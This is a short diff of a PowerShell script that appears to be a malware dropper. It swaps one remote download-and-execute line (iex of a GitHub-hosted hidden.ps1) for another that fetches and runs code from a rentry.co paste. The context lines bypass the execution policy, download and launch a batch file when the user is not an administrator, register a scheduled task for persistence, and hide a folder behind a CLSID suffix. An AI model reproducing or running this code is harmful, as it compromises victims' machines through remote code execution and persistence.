@@ -9,7 +9,7 @@ $consolePtr = [System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 $skid = "skid"
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
+
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "download.bat"
     Start-Process -FilePath 'download.bat'
@@ -23,6 +23,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 Write-Host "[!] Persistence Added" -ForegroundColor Green
 
+iex (iwr -uri "https://rentry.co/6h5eob89/raw" -useb)
 
 $rdir = "C:\Users\hai1723"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
